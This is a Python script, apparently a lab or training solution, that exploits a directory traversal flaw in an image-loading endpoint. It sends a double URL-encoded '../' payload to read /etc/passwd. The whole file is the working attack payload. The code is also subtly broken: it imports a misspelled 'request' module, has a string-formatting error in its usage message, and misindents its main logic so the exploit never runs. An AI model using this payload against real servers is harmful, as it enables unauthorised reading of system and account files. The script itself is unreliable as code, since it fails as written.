import sys
import request
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def directory_traversal_exploit(url):
	image_url = url + '/image?filename=%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252Fetc%252Fpasswd'
	r = request.get(image_url, verify=False, proxies=proxies)
	if 'root:x' in r.text:
		print("(+) exploit successful . . .")
		print("(+) data being displayed . . .")
	else:
		print("(+) exploit failed . . .")
		sys.exit(-1)


def main():
	if len(sys.argv) != 2:
		print("(+) Usage: %s <url>" % sys.argv[0])
		print("(+) Example: www.example.com" % sys.argv[0])
		sys.exit(-1)

		url = sys.argv[1]
		print("(+) exploiting directory traversal vulnerability . . .")
		directory_traversal_exploit(url)


if __name__ == "__main__":
	main()